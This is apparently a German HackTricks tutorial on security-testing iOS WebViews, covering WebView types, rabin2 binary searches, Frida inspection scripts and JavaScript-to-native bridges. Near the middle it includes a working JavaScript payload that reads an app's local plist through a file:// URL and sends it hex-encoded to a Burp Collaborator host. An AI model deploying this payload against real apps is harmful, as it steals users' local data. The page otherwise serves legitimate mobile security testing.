# iOS WebViews

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

Der Code dieser Seite wurde von [hier](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md) extrahiert. √úberpr√ºfen Sie die Seite f√ºr weitere Details.


## Arten von WebViews

WebViews werden in Anwendungen verwendet, um interaktiv Webinhalte anzuzeigen. Verschiedene Arten von WebViews bieten unterschiedliche Funktionen und Sicherheitsfunktionen f√ºr iOS-Anwendungen. Hier ist ein kurzer √úberblick:

- **UIWebView**, das ab iOS 12 nicht mehr empfohlen wird, da es keine Unterst√ºtzung zum Deaktivieren von **JavaScript** bietet und anf√§llig f√ºr Skripteinbindung und **Cross-Site Scripting (XSS)**-Angriffe ist.

- **WKWebView** ist die bevorzugte Option zur Integration von Webinhalten in Apps und bietet eine verbesserte Kontrolle √ºber den Inhalt und Sicherheitsfunktionen. **JavaScript** ist standardm√§√üig aktiviert, kann aber bei Bedarf deaktiviert werden. Es unterst√ºtzt auch Funktionen, um zu verhindern, dass JavaScript automatisch Fenster √∂ffnet, und stellt sicher, dass alle Inhalte sicher geladen werden. Dar√ºber hinaus minimiert die Architektur von **WKWebView** das Risiko von Speicherbesch√§digungen im Hauptprozess der App.

- **SFSafariViewController** bietet eine standardisierte Webbrowser-Erfahrung in Apps, die anhand ihres spezifischen Layouts erkennbar ist, einschlie√ülich eines schreibgesch√ºtzten Adressfelds, Freigabe- und Navigationsbuttons sowie eines direkten Links zum √ñffnen von Inhalten in Safari. Im Gegensatz zu **WKWebView** kann **JavaScript** in **SFSafariViewController** nicht deaktiviert werden, das auch Cookies und Daten mit Safari teilt und die Privatsph√§re des Benutzers von der App aus gew√§hrleistet. Es muss gem√§√ü den App Store-Richtlinien prominent angezeigt werden.
```javascript
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## Zusammenfassung der WebViews-Konfigurationserkundung

### **√úbersicht der statischen Analyse**

Bei der Untersuchung von WebViews-Konfigurationen konzentrieren wir uns auf zwei Haupttypen: **UIWebView** und **WKWebView**. Um diese WebViews in einer Bin√§rdatei zu identifizieren, werden Befehle verwendet, um nach bestimmten Klassenreferenzen und Initialisierungsmethoden zu suchen.

- **Identifizierung von UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
Dieser Befehl hilft dabei, Instanzen von **UIWebView** zu finden, indem nach Textzeichenketten gesucht wird, die damit in der Bin√§rdatei zusammenh√§ngen.

- **WKWebView Identifizierung**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
Ebenso sucht dieser Befehl in der Bin√§rdatei nach Textzeichenketten, die auf die Verwendung von **WKWebView** hinweisen.

Dar√ºber hinaus wird der folgende Befehl ausgef√ºhrt, um herauszufinden, wie ein **WKWebView** initialisiert wird. Dabei wird die Methode signaturbezogen auf die Initialisierung anvisiert:
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **√úberpr√ºfung der JavaScript-Konfiguration**

F√ºr **WKWebView** wird hervorgehoben, dass das Deaktivieren von JavaScript eine bew√§hrte Methode ist, es sei denn, es ist erforderlich. Die kompilierte Bin√§rdatei wird durchsucht, um zu best√§tigen, dass die Eigenschaft `javaScriptEnabled` auf `false` gesetzt ist, um sicherzustellen, dass JavaScript deaktiviert ist:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **Nur sichere Inhalts√ºberpr√ºfung**

**WKWebView** bietet die M√∂glichkeit, gemischte Inhaltsprobleme zu identifizieren, im Gegensatz zu **UIWebView**. Dies wird mithilfe der Eigenschaft `hasOnlySecureContent` √ºberpr√ºft, um sicherzustellen, dass alle Seitenressourcen √ºber sichere Verbindungen geladen werden. Die Suche in der kompilierten Bin√§rdatei erfolgt wie folgt:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **Einblicke in die dynamische Analyse**

Die dynamische Analyse beinhaltet die Untersuchung des Heaps nach WebView-Instanzen und deren Eigenschaften. Ein Skript namens `webviews_inspector.js` wird zu diesem Zweck verwendet und zielt auf `UIWebView`, `WKWebView` und `SFSafariViewController`-Instanzen ab. Es protokolliert Informationen √ºber gefundene Instanzen, einschlie√ülich URLs und Einstellungen in Bezug auf JavaScript und sichere Inhalte.

Die Heap-Inspektion kann mithilfe von `ObjC.choose()` durchgef√ºhrt werden, um WebView-Instanzen zu identifizieren und die Eigenschaften `javaScriptEnabled` und `hasonlysecurecontent` zu √ºberpr√ºfen.

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

Das Skript wird mit folgendem Befehl ausgef√ºhrt:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**Hauptergebnisse**:
- Instanzen von WebViews werden erfolgreich lokalisiert und √ºberpr√ºft.
- Die Aktivierung von JavaScript und die Einstellungen f√ºr sichere Inhalte werden √ºberpr√ºft.

Diese Zusammenfassung umfasst die wesentlichen Schritte und Befehle zur Analyse von WebView-Konfigurationen durch statische und dynamische Ans√§tze, wobei der Schwerpunkt auf Sicherheitsfunktionen wie der Aktivierung von JavaScript und der Erkennung von gemischtem Inhalt liegt.

## Behandlung von WebView-Protokollen

Die Behandlung von Inhalten in WebViews ist ein entscheidender Aspekt, insbesondere beim Umgang mit verschiedenen Protokollen wie `http(s)://`, `file://` und `tel://`. Diese Protokolle erm√∂glichen das Laden von sowohl remote als auch lokal gespeicherten Inhalten in Apps. Es wird betont, dass beim Laden von lokalen Inhalten Vorsichtsma√ünahmen getroffen werden m√ºssen, um zu verhindern, dass Benutzer den Dateinamen oder -pfad beeinflussen oder den Inhalt selbst bearbeiten k√∂nnen.

**WebViews** bieten verschiedene Methoden zum Laden von Inhalten. F√ºr **UIWebView**, das jetzt veraltet ist, werden Methoden wie `loadHTMLString:baseURL:` und `loadData:MIMEType:textEncodingName:baseURL:` verwendet. **WKWebView** hingegen verwendet `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:` und `loadRequest:` f√ºr Webinhalte. Methoden wie `pathForResource:ofType:`, `URLForResource:withExtension:` und `init(contentsOf:encoding:)` werden normalerweise zum Laden von lokalen Dateien verwendet. Die Methode `loadFileURL:allowingReadAccessToURL:` ist besonders bemerkenswert, da sie eine bestimmte URL oder ein Verzeichnis in den WebView laden kann und dabei potenziell sensible Daten offenlegen kann, wenn ein Verzeichnis angegeben ist.

Um diese Methoden im Quellcode oder im kompilierten Bin√§rformat zu finden, k√∂nnen Befehle wie die folgenden verwendet werden:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
In Bezug auf den **Dateizugriff** erm√∂glicht UIWebView dies universell, w√§hrend WKWebView die Einstellungen `allowFileAccessFromFileURLs` und `allowUniversalAccessFromFileURLs` einf√ºhrt, um den Zugriff von Datei-URLs zu verwalten. Beide Einstellungen sind standardm√§√üig auf false gesetzt.

Ein Beispiel f√ºr ein Frida-Skript wird bereitgestellt, um die Sicherheitseinstellungen von **WKWebView** zu √ºberpr√ºfen:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
Zuletzt wird ein Beispiel f√ºr eine JavaScript-Payload gezeigt, die darauf abzielt, lokale Dateien zu exfiltrieren und das potenzielle Sicherheitsrisiko bei unsachgem√§√ü konfigurierten WebViews verdeutlicht. Diese Payload kodiert den Dateiinhalt in hexadezimaler Form, bevor er an einen Server √ºbertragen wird, was die Bedeutung strenger Sicherheitsma√ünahmen bei der Implementierung von WebViews hervorhebt.
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## Native Methoden, die durch WebViews freigelegt werden

## Verst√§ndnis der nativen Schnittstellen von WebViews in iOS

Ab iOS 7 hat Apple APIs zur **Kommunikation zwischen JavaScript in einem WebView und nativen** Swift- oder Objective-C-Objekten bereitgestellt. Diese Integration wird haupts√§chlich durch zwei Methoden erm√∂glicht:

- **JSContext**: Eine JavaScript-Funktion wird automatisch erstellt, wenn ein Swift- oder Objective-C-Block mit einem Bezeichner in einem `JSContext` verkn√ºpft wird. Dadurch wird eine nahtlose Integration und Kommunikation zwischen JavaScript und nativem Code erm√∂glicht.
- **JSExport-Protokoll**: Durch Vererbung des `JSExport`-Protokolls k√∂nnen native Eigenschaften, Instanzmethoden und Klassenmethoden f√ºr JavaScript freigelegt werden. Dies bedeutet, dass √Ñnderungen, die in der JavaScript-Umgebung vorgenommen werden, in der nativen Umgebung gespiegelt werden und umgekehrt. Es ist jedoch wichtig sicherzustellen, dass sensible Daten nicht versehentlich √ºber diese Methode freigelegt werden.

### Zugriff auf `JSContext` in Objective-C

In Objective-C kann der `JSContext` f√ºr ein `UIWebView` mit der folgenden Codezeile abgerufen werden:
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### Kommunikation mit `WKWebView`

F√ºr `WKWebView` ist kein direkter Zugriff auf `JSContext` verf√ºgbar. Stattdessen wird die Nachrichten√ºbermittlung √ºber die Funktion `postMessage` genutzt, um die Kommunikation zwischen JavaScript und der nativen Anwendung zu erm√∂glichen. Handler f√ºr diese Nachrichten werden wie folgt eingerichtet, um eine sichere Interaktion zwischen JavaScript und der nativen Anwendung zu erm√∂glichen:
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### Interaktion und Testen

JavaScript kann mit der nativen Ebene interagieren, indem ein Skript-Nachrichten-Handler definiert wird. Dadurch k√∂nnen Operationen wie das Aufrufen von nativen Funktionen von einer Webseite aus durchgef√ºhrt werden:
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Um das Ergebnis eines nativen Funktionsaufrufs zu erfassen und zu manipulieren, kann man die R√ºckruffunktion innerhalb des HTMLs √ºberschreiben:
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
Die native Seite behandelt den JavaScript-Aufruf wie in der Klasse `JavaScriptBridgeMessageHandler` gezeigt. Dort wird das Ergebnis von Operationen wie der Multiplikation von Zahlen verarbeitet und an JavaScript zur Anzeige oder weiteren Manipulation zur√ºckgesendet:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## Debugging iOS WebViews

(Tutorial basierend auf dem von [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

Um Webinhalte innerhalb von iOS-Webviews effektiv zu debuggen, ist eine spezifische Einrichtung erforderlich, die die Entwicklertools von Safari verwendet, da Nachrichten, die an `console.log()` gesendet werden, nicht in den Xcode-Protokollen angezeigt werden. Hier ist eine vereinfachte Anleitung, die die wichtigsten Schritte und Anforderungen hervorhebt:

- **Vorbereitung auf dem iOS-Ger√§t**: Der Safari Web Inspector muss auf Ihrem iOS-Ger√§t aktiviert sein. Dies erfolgt, indem Sie zu **Einstellungen > Safari > Erweitert** gehen und den _Web Inspector_ aktivieren.

- **Vorbereitung auf dem macOS-Ger√§t**: Auf Ihrem macOS-Entwicklungscomputer m√ºssen Sie die Entwicklertools in Safari aktivieren. Starten Sie Safari, rufen Sie **Safari > Einstellungen > Erweitert** auf und w√§hlen Sie die Option _Entwicklermen√º anzeigen_.

- **Verbindung und Debugging**: Nachdem Sie Ihr iOS-Ger√§t mit Ihrem macOS-Computer verbunden und Ihre Anwendung gestartet haben, verwenden Sie Safari auf Ihrem macOS-Ger√§t, um den Webview auszuw√§hlen, den Sie debuggen m√∂chten. Navigieren Sie zu _Entwickeln_ in der Men√ºleiste von Safari, fahren Sie mit der Maus √ºber den Namen Ihres iOS-Ger√§ts, um eine Liste der Webview-Instanzen anzuzeigen, und w√§hlen Sie die Instanz aus, die Sie inspizieren m√∂chten. Ein neues Fenster des Safari Web Inspectors wird zu diesem Zweck ge√∂ffnet.

Beachten Sie jedoch die Einschr√§nkungen:

- Das Debuggen mit dieser Methode erfordert ein macOS-Ger√§t, da es auf Safari angewiesen ist.
- Nur Webviews in √ºber Xcode auf Ihr Ger√§t geladenen Anwendungen k√∂nnen debuggt werden. Webviews in √ºber den App Store oder Apple Configurator installierten Apps k√∂nnen nicht auf diese Weise debuggt werden.


## Referenzen

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
